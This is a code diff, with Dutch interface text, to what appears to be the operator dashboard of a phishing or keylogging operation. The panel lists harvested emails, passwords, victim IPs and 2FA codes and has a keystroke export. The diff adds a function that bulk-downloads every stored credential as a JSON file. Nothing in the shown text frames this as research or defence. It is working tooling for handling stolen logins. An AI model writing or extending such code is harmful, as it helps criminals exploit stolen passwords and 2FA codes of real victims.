@@ -703,6 +703,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
                     <option value="google_2fa">🔒 2FA-codes</option>
                 </select>
                 <button class="btn export" onclick="downloadCredentialsCSV()" title="Download als CSV bestand">⬇ CSV</button>
+                <button class="btn export" onclick="downloadCredentialsJSON()" title="Download als JSON bestand">⬇ JSON</button>
                 <button class="btn danger" onclick="if(confirm('Delete all credentials?'))clearCredentials()">Clear</button>
             </div>
         </div>
@@ -3326,6 +3327,20 @@ async function downloadCredentialsCSV() {
     creds.forEach((cr, i) => rows.push([i + 1, cr.clientId||'', cr.timestamp, cr.email, cr.password, cr.source, cr.ip]));
     csvDownload(rows, 'credentials');
     toast('⬇️ ' + creds.length + ' credentials gedownload als CSV');
+}
+
+async function downloadCredentialsJSON() {
+    const creds = await api('/api/credentials?limit=9999' + filterParam());
+    if (!creds || !creds.length) { toast('⚠️ Geen credentials om te downloaden'); return; }
+    const json = JSON.stringify(creds, null, 2);
+    const blob = new Blob([json], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'credentials_' + new Date().toISOString().slice(0, 10) + '.json';
+    a.click();
+    URL.revokeObjectURL(url);
+    toast('⬇️ ' + creds.length + ' credentials gedownload als JSON');
 }
 
 async function downloadKeystrokesCSV() {
